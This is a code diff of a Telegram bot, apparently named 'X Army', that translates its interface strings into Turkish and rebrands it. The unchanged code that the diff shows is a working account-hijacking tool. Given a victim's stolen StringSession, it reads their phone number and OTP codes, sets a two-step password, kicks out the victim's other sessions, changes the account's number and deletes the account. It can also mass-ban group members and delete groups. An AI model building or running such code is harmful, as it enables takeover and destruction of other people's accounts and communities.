@@ -149,55 +149,55 @@ logging.basicConfig(level=logging.WARNING)
 channel = "TheXArmy"
 menu = '''
 
-**NOTICE JOIN @TheXArmy FEDERATION**
-FED ID `2936f6a8-cc1d-4f76-ac1f-ac752fe5caef`
+**@georgia_icraat FEDERATION🇬🇪🐊**
+FED ID `34d81b1d-e277-41af-90e1-6e91abaf7cdf`
 
 
-A: [check user own groups and channels]
+A: [kullanıcının kendi gruplarını ve kanallarını kontrol edin]
 
-B: [check user all information like phone number usrname...]
+B: [kullanıcı telefon numarası kullanıcı adı gibi tüm bilgileri kontrol edin...]
 
-C: [ban a group {give me StringSession and channel/group username i will ban all members there}]
+C: [bir grubu yasakla {bana StringSession ve kanal/grup kullanıcı adını ver oradaki tüm üyeleri yasaklayacağım}]
 
-D: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
+D: [kullanıcıyı son otp bil {1. kullanım seçeneği B telefon numarasını al ve orada oturum aç Hesap sonra beni kullan sana otp vereceğim}]
 
-E: [Join A Group/Channel via StringSession]
+E: [StringSession ile Bir Gruba/Kanala Katılın]
 
-F: [Leave A Group/Channel via StringSession]
+F: [StringSession aracılığıyla bir Gruptan/Kanaldan Ayrılın]
 
-G: [Delete A Group/Channel]
+G: [Bir Grubu/Kanalı Sil]
 
-H: [Check user two step is eneable or disable]
+H: [Kullanıcıyı kontrol edin iki adım etkinleştirin veya devre dışı bırakın]
 
-I: [Terminate All current active sessions except Your StringSession]
+I: [StringSession'ınız dışındaki tüm mevcut aktif oturumları sonlandırın]
 
-J: [Delete Account]
+J: [Hesabı sil]
 
-K: [Demote all admins in a group/channel]
+K: [Bir gruptaki/kanaldaki tüm yöneticileri indir]
 
-L: [Promote a member in a group/channel]
+L: [Bir grupta/kanalda bir üyeyi tanıtın]
 
-M: [Change Phone number using StringSession]
+M: [StringSession kullanarak Telefon numarasını değiştirin]
 
-I ADD MORE FEATURES LATER 😆
+SONRA DAHA FAZLA ÖZELLİK EKLERİM 🥱
 '''
 mm = '''
-You can hack anybody
-Take his StringSession and use me
-I will give you full power of mine
-Type /hack
+herkesi hackleyebilirsin
+Onun StringSession'ını al ve beni kullan
+sana tüm gücümü vereceğim
+/hack yazın
 '''
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
   global mm
   if not event.is_private:
-    await event.reply("please use me in pm🥺")
+    await event.reply("lütfen beni pm'de kullan😒")
   else:
     await event.reply(mm)
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
   if not event.sender_id == legendx:
-    return await event.reply("please don't use me fuck off 🥺")
+    return await event.reply("lütfen beni kullanma siktir git 🥱")
   try:
     await event.reply("session bot file", file="Xarmy.session")
   except Exception as e:
@@ -206,26 +206,26 @@ async def op(event):
 
 @client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
 async def op(event):
-  await event.reply("please use me in pm🥺")
+  await event.reply("lütfen beni pm'de kullan😒")
 @client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
 async def start(event):
   global menu
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message(f"Choose what you want with string session \n\n{menu}")
+    await x.send_message(f"Dize oturumu ile ne istediğinizi seçin \n\n{menu}")
     res = await x.get_response()
     r = res.text
     if res.text == "A":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("DİZEL OTURUM VER")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("Bu StringSession belki sonlandırılır")
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("This StringSession is terminated maybe")
+        return await event.reply("Bu StringSession belki sonlandırılır")
       if len(i) > 3855:
         file = open("session.txt", "w")
         file.write(i + "\n\nDETAILS BY X ARMY")
@@ -233,7 +233,7 @@ async def start(event):
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using X Army Bot")
+        await event.reply(i + "\n\n ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
     elif res.text == "B":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -241,157 +241,157 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("Bu StringSession belki sonlandırılır")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
     elif r == "C":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("DİZEL OTURUM VER")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("Bu StringSession belki sonlandırılır")
+      await x.send_message("GRUP/KANAL KULLANICI ADI/ID VER")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using X Army Bot")
+      await event.reply("Tüm üyeler yasaklanıyor ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
     elif r == "D":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("DİZEL OTURUM VER")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("Bu StringSession belki sonlandırılır")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\n ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
     elif r == "E":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("DİZEL OTURUM VER")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("Bu StringSession belki sonlandırılır")
+      await x.send_message("GRUP/KANAL KULLANICI ADI/ID VER")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Kanala/Gruba Katıldınız ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u Kullandığınız İçin Teşekkürler")
     elif r == "F":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("DİZEL OTURUM VER")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("Bu StringSession belki sonlandırılır")
+      await x.send_message("GRUP/KANAL KULLANICI ADI/ID VER")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Kanaldan/Gruptan Ayrıldı ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u Kullandığınız İçin Teşekkürler")
     elif r == "G":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("DİZEL OTURUM VER")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("Bu StringSession belki sonlandırılır")
+      await x.send_message("GRUP/KANAL KULLANICI ADI/ID VER")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Kanalı/Grubu Silindi ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u Kullandığınız İçin Teşekkürler")
     elif r == "H":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("DİZEL OTURUM VER")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("Bu StringSession belki sonlandırılır")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
+        await event.reply("Kullanıcının iki adımı yok, bu yüzden şimdi iki adı `ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊` şimdi giriş yapabilirsiniz\n\nɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
       else:
-        await event.reply("Sorry User Have two step already")
+        await event.reply("Üzgünüm Kullanıcı Zaten iki adım var")
     elif r == "I":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("DİZEL OTURUM VER")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("Bu StringSession belki sonlandırılır")
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using X Army Bot")
+      await event.reply("Tüm oturumlar sonlandırıldı\n\nɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
     elif res.text == "J":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("DİZEL OTURUM VER")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("Bu StringSession belki sonlandırılır")
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using X Army Bot")
+      await event.reply("Hesap BAŞARIYLA silindi\n\nɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
     elif res.text == "L":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("DİZEL OTURUM VER")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+        return await event.respond("Bu StringSession belki sonlandırılır")
+      await x.send_message("ŞİMDİ GRUP/KANAL KULLANICI ADI VERİN")
       grp = await x.get_response()
-      await x.send_message("NOW GIVE USER USERNAME")
+      await x.send_message("ŞİMDİ KULLANICIYA KULLANICI ADI VERİN")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("Sizi Grupta/Kanalda Tanıtıyorum Bir dakika bekleyin 😗😗\n\nɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
     elif res.text == "K":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("DİZEL OTURUM VER")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+        return await event.respond("Bu StringSession belki sonlandırılır")
+      await x.send_message("ŞİMDİ GRUP/KANAL KULLANICI ADI VERİN")
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("Grubun/Kanalın tüm üyelerini indiriyorum bir dakika bekleyin 😗😗\n\nɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
     elif res.text == "M":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("DİZEL OTURUM VER")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
+        return await event.respond("Bu StringSession belki sonlandırılır")
+      await x.send_message("DEĞİŞTİRMEK İSTEDİĞİNİZ NUMARAYI VERİN\n[NOT: 2. satırı veya metni şimdi numaraları KULLANMAYIN]\n[şimdi 2. satırı veya metni kullanıyorsanız, numara alamazsınız] ")
       number = (await x.get_response()).text
       try:
         result = await change_number(strses.text, number)
-        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+        await event.respond(result + "\n telefon kodu özetini kopyalayın ve numaranızı kontrol edin, otp\ni 20 saniye durun telefon kodu özetini ve otp'yi kopyalayın")
         await asyncio.sleep(20)
-        await x.send_message("NOW GIVE PHONE CODE HASH")
+        await x.send_message("ŞİMDİ TELEFON KODU HASH VERİN")
         phone_code_hash = (await x.get_response()).text
         await x.send_message("NOW GIVE THE OTP")
         otp = (await x.get_response()).text
         changing = await change_number_code(strses.text, number, phone_code_hash, otp)
         if changing:
-          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
+          await event.respond("TEBRİKLER NUMARA DEĞİŞTİ")
         else:
-          await event.respond("Something is wrong")
+          await event.respond("Bir şey yanlış")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @sessionhack_chat\n**LOGS**\n" + str(e))
+        await event.respond("BU HATAYI GÖNDER - @cosmic_house\n**LOGS**\n" + str(e))
 
     else:
-      await event.respond("Wrong Text Found Re type /hack and use")
+      await event.respond("Yanlış Metin Bulundu Yeniden yazın /hack ve kullanın")
 
 
 
